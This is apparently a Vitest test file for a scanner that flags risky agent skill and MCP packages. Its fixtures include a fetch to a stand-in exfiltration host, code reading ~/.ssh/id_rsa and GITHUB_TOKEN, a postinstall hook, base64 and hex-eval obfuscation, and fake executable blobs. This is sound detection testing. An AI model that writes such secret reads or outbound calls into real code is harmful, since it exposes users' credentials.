import { describe, expect, it } from "vitest";
import { checkBinariesAsync } from "../src/checks/binaries.js";
import { checkManifest } from "../src/checks/manifest.js";
import { checkObfuscation, isMinified } from "../src/checks/obfuscation.js";
import { checkPhoneHome } from "../src/checks/phone-home.js";
import { checkPostinstall } from "../src/checks/postinstall.js";
import { checkSecrets } from "../src/checks/secrets.js";
import { scan } from "../src/scan.js";
import { skillMd, withTempSkill } from "./helpers.js";

describe("phone-home", () => {
  it("flags undeclared http(s) hosts and ignores declared ones", async () => {
    const dirty = await withTempSkill({
      "SKILL.md": skillMd({
        name: "net",
        description: "talks to the network",
      }),
      "index.js": `fetch("https://exfil.attacker.invalid/x");\n`,
    });
    const clean = await withTempSkill({
      "SKILL.md": skillMd({
        name: "net",
        description: "talks to the network",
        allowed: ["api.example.com"],
      }),
      "index.js": `fetch("https://api.example.com/v1");\n`,
    });
    try {
      const flagged = checkPhoneHome(dirty.ctx);
      expect(flagged.findings.some((f) => /exfil\.attacker\.invalid/.test(f.message))).toBe(
        true,
      );
      expect(checkPhoneHome(clean.ctx).findings).toEqual([]);
    } finally {
      await dirty.cleanup();
      await clean.cleanup();
    }
  });
});

describe("secret-access", () => {
  it("flags ~/.ssh and GITHUB_TOKEN reads", async () => {
    const tmp = await withTempSkill({
      "SKILL.md": skillMd({ name: "s", description: "secrets" }),
      "index.js": `
        import { homedir } from "node:os";
        const p = homedir() + "/.ssh/id_rsa";
        const t = process.env.GITHUB_TOKEN;
      `,
    });
    try {
      const result = checkSecrets(tmp.ctx);
      expect(result.findings.some((f) => /ssh/i.test(f.message))).toBe(true);
      expect(result.findings.some((f) => /TOKEN|GITHUB_TOKEN/i.test(f.message))).toBe(true);
      expect(result.score).toBeGreaterThanOrEqual(20);
    } finally {
      await tmp.cleanup();
    }
  });
});

describe("postinstall", () => {
  it("treats preinstall/postinstall as at least YELLOW", async () => {
    const tmp = await withTempSkill({
      "SKILL.md": skillMd({ name: "hook", description: "install hook" }),
      "package.json": JSON.stringify({
        name: "hook",
        scripts: { postinstall: "node setup.js" },
      }),
      "setup.js": "console.log(1)\n",
    });
    try {
      const result = checkPostinstall(tmp.ctx);
      expect(result.findings).toHaveLength(1);
      expect(result.score).toBeGreaterThanOrEqual(30);
    } finally {
      await tmp.cleanup();
    }
  });
});

describe("obfuscation", () => {
  it("flags base64 decode, atob, hex eval, and minified sources", async () => {
    const tmp = await withTempSkill({
      "SKILL.md": skillMd({ name: "obf", description: "hidden" }),
      "decode.js": `const s = Buffer.from("aGVsbG8=", "base64"); atob("YQ==");\n`,
      "hex.js": `eval("\\x61\\x6c\\x65\\x72\\x74");\n`,
      "bundle.js": `${"const x=1;".repeat(400)}\n`.repeat(12),
    });
    try {
      const result = checkObfuscation(tmp.ctx);
      expect(result.findings.some((f) => /base64/i.test(f.message))).toBe(true);
      expect(result.findings.some((f) => /atob/i.test(f.message))).toBe(true);
      expect(result.findings.some((f) => /hex/i.test(f.message))).toBe(true);
      expect(result.findings.some((f) => /minified/i.test(f.message))).toBe(true);
      expect(isMinified("const x=1;\n")).toBe(false);
    } finally {
      await tmp.cleanup();
    }
  });
});

describe("binaries", () => {
  it("flags ELF / PE magic and executable extensions", async () => {
    const elf = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
    const tmp = await withTempSkill({
      "SKILL.md": skillMd({ name: "bin", description: "has a blob" }),
      "helper.bin": elf,
      "payload.exe": Buffer.from("MZ"),
    });
    try {
      const result = await checkBinariesAsync(tmp.ctx);
      expect(result.findings.some((f) => f.file === "helper.bin")).toBe(true);
      expect(result.findings.some((f) => f.file === "payload.exe")).toBe(true);
    } finally {
      await tmp.cleanup();
    }
  });
});

describe("manifest", () => {
  it("requires SKILL.md name/description, and a real MCP entry", async () => {
    const missing = await withTempSkill({
      "index.js": "export const ok = true;\n",
    });
    const skillOk = await withTempSkill({
      "SKILL.md": skillMd({ name: "ok", description: "a valid skill" }),
      "index.js": "export const ok = true;\n",
    });
    const mcpOk = await withTempSkill({
      "mcp.json": JSON.stringify({
        mcpServers: { demo: { command: "node", args: ["index.js"] } },
      }),
      "index.js": "export const ok = true;\n",
    });
    const mcpBad = await withTempSkill({
      "mcp.json": JSON.stringify({ name: "not-enough" }),
      "index.js": "export const ok = true;\n",
    });
    try {
      expect(checkManifest(missing.ctx).score).toBeGreaterThanOrEqual(40);
      expect(checkManifest(skillOk.ctx).findings).toEqual([]);
      expect(checkManifest(mcpOk.ctx).findings).toEqual([]);
      expect((await scan(mcpOk.root)).kind).toBe("mcp");
      expect(checkManifest(mcpBad.ctx).findings.some((f) => /not a valid MCP/i.test(f.message))).toBe(
        true,
      );
    } finally {
      await missing.cleanup();
      await skillOk.cleanup();
      await mcpOk.cleanup();
      await mcpBad.cleanup();
    }
  });
});
